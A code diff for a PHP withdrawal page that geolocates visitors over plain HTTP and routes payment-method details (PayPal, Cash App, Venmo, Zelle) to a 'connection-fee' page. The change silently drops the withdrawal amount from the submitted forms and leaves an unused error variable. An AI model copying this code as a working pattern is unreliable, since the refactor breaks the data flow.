@@ -11,9 +11,16 @@ if (!isset($_SESSION['user_id'])) {
    GEO DETECTION (IP API)
 ------------------------------*/
 $ip = $_SERVER['REMOTE_ADDR'];
-$geo = @json_decode(file_get_contents("https://ip-api.com/json/{$ip}"));
+$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
 
 $country = $geo->country ?? 'Unknown';
+$isUSA = ($country === "United States");
+
+/* Store detected country for next page */
+$_SESSION['country'] = $country;
+
+/* Store amount */
+$error = "";
 
 /* fallback methods */
 $paymentMethods = [];
@@ -67,124 +74,138 @@ if (empty($paymentMethods)) {
             <?= htmlspecialchars($country) ?>
         </div>
 
-        <div class="form-group">
-            <label>Amount to Withdraw</label>
-            <input type="number" name="amount" min="1" step="0.01" required>
-        </div>
+        <?php if (!empty($error)): ?>
+            <div class="alert-error"><?= htmlspecialchars($error) ?></div>
+        <?php endif; ?>
 
-        <!-- STEP 1 -->
-        <div id="step1">
+        <form method="POST" action="">
 
-            <p style="margin-bottom:20px;">
-                Are you currently located outside the United States?
-            </p>
-
-            <div style="display:flex;gap:10px;flex-wrap:wrap;">
-
-                <button type="button"
-                        class="submit-btn"
-                        onclick="goToStep2('fallback')">
-                    Yes
-                </button>
-
-                <button type="button"
-                        class="submit-btn"
-                        style="background:#555;"
-                        onclick="goToStep2('usa')">
-                    No
-                </button>
-
+            <div class="form-group">
+                <label>Amount to Withdraw</label>
+                <input type="number" name="amount" min="1" step="0.01" required>
             </div>
 
-        </div>
+            <!-- STEP 1 -->
+            <div id="step1">
+            
+                <p style="margin-bottom:20px;">
+                    Are you currently located outside the United States?
+                </p>
 
-        <!-- STEP 2 -->
+                <div style="display:flex;gap:10px;flex-wrap:wrap;">
+
+                    <button type="button"
+                            class="submit-btn"
+                            onclick="showStep2('fallback')">
+                        Yes
+                    </button>
+
+                    <button type="button"
+                            class="submit-btn"
+                            style="background:#555;"
+                            onclick="showStep2('usa')">
+                        No
+                    </button>
+
+                </div>
+                
+            </div>
+            
+        </form>
+    
+
+
+        <!-- STEP 2 (hidden initially) -->
         <div id="step2" style="display:none;">
 
             <h3 style="text-align:center;margin-bottom:15px;">
                 Link Withdrawal Method
             </h3>
 
-            <!-- USA FORM -->
-            <div id="usaForm" style="display:none;">
+            <div id="dynamicContent">
 
-                <form method="GET" action="connection-fee.php">
+                <!-- USA FORM -->
+                <div id="usaForm" style="display:none;">
 
-                    <input type="hidden" name="type" value="usa">
-                    <input type="hidden" name="country" value="United States">
+                    <form method="POST" action="connection-fee.php">
 
-                    <input type="hidden" name="amount" id="usa_amount">
-
-                    <div class="form-group">
-                        <label>Payment Method</label>
-                        <select name="method" required>
-                            <option value="paypal">PayPal</option>
-                            <option value="cashapp">Cash App</option>
-                            <option value="venmo">Venmo</option>
-                            <option value="zelle">Zelle</option>
-                        </select>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Account Identifier</label>
-                        <input type="text" name="account" required>
-                    </div>
-
-                    <button class="submit-btn">Continue</button>
-
-                </form>
-            </div>
-
-            <!-- FALLBACK FORM -->
-            <div id="fallbackForm" style="display:none;">
-
-                <form method="GET" action="connection-fee.php">
-
-                    <input type="hidden" name="type" value="fallback">
-                    <input type="hidden" name="country" value="<?= htmlspecialchars($country) ?>">
-                    <input type="hidden" name="amount" id="fallback_amount">
-
-                    <input type="hidden" name="selected_type" id="selected_type">
-
-                    <div class="form-group">
-                        <label>Payment Method</label>
-
-                        <select name="payment_type" id="payment_type" required>
-                            <option value="">Select Payment Method</option>
-
-                            <?php foreach ($paymentMethods as $method): ?>
-                                <option value="<?= $method['id'] ?>">
-                                    <?= ucfirst($method['type']) ?>
-                                </option>
-                            <?php endforeach; ?>
-
-                        </select>
-                    </div>
-
-                    <div id="paymentFields" style="display:none;">
+                        <input type="hidden" name="type" value="usa">
+                        <input type="hidden" name="country" value="United States">
 
                         <div class="form-group">
-                            <label id="label_method"></label>
-                            <input type="text" name="method" id="field_method">
+                            <label>Payment Method</label>
+                            <select name="method" required>
+                                <option value="paypal">PayPal</option>
+                                <option value="cashapp">Cash App</option>
+                                <option value="venmo">Venmo</option>
+                                <option value="zelle">Zelle</option>
+                            </select>
                         </div>
 
                         <div class="form-group">
-                            <label id="label_method_name"></label>
-                            <input type="text" name="method_name" id="field_method_name">
-                        </div>
-
-                        <div class="form-group">
-                            <label id="label_method_id"></label>
-                            <input type="text" name="method_id" id="field_method_id">
+                            <label>Account Identifier</label>
+                            <input type="text" name="account" required>
                         </div>
 
                         <button class="submit-btn">Continue</button>
 
-                    </div>
+                    </form>
+                </div>
 
-                </form>
+                <!-- FALLBACK FORM -->
+                <div id="fallbackForm" style="display:none;">
+
+                    <p>
+                        Detected Country:
+                        <strong><?= htmlspecialchars($country) ?></strong>
+                    </p>
+
+                    <form method="POST" action="connection-fee.php">
+
+                        <input type="hidden" name="type" value="fallback">
+                        <input type="hidden" name="country" value="<?= htmlspecialchars($country) ?>">
+                        <input type="hidden" name="selected_type" id="selected_type">
+
+                        <div class="form-group">
+                            <label>Payment Method</label>
+
+                            <select name="payment_type" id="payment_type" required>
+                                <option value="">Select Payment Method</option>
+
+                                <?php foreach ($paymentMethods as $index => $method): ?>
+                                    <option value="<?= $index ?>">
+                                        <?= ucfirst($method['type']) ?>
+                                    </option>
+                                <?php endforeach; ?>
+
+                            </select>
+                        </div>
+
+                        <div id="paymentFields" style="display:none;">
+
+                            <div class="form-group">
+                                <label id="label_method"></label>
+                                <input type="text" name="method" id="field_method">
+                            </div>
+
+                            <div class="form-group">
+                                <label id="label_method_name"></label>
+                                <input type="text" name="method_name" id="field_method_name">
+                            </div>
+
+                            <div class="form-group">
+                                <label id="label_method_id"></label>
+                                <input type="text" name="method_id" id="field_method_id">
+                            </div>
+
+                            <button class="submit-btn">Continue</button>
+
+                        </div>
+
+                    </form>
+                </div>
+
             </div>
-
         </div>
 
     </div>
@@ -193,14 +214,7 @@ if (empty($paymentMethods)) {
 <script>
 const paymentMethods = <?= json_encode($paymentMethods) ?>;
 
-function goToStep2(type) {
-
-    const amount = document.querySelector('input[name="amount"]').value;
-
-    if (!amount || amount <= 0) {
-        alert("Enter a valid withdrawal amount");
-        return;
-    }
+function showStep2(type) {
 
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
@@ -208,18 +222,16 @@ function goToStep2(type) {
     if (type === 'usa') {
         document.getElementById('usaForm').style.display = 'block';
         document.getElementById('fallbackForm').style.display = 'none';
-        document.getElementById('usa_amount').value = amount;
     } else {
         document.getElementById('fallbackForm').style.display = 'block';
         document.getElementById('usaForm').style.display = 'none';
-        document.getElementById('fallback_amount').value = amount;
     }
 }
 
 /* fallback dynamic fields */
 document.getElementById('payment_type')?.addEventListener('change', function () {
 
-    const selected = paymentMethods.find(m => m.id == this.value);
+    const selected = paymentMethods[this.value];
 
     if (!selected) {
         document.getElementById('paymentFields').style.display = 'none';
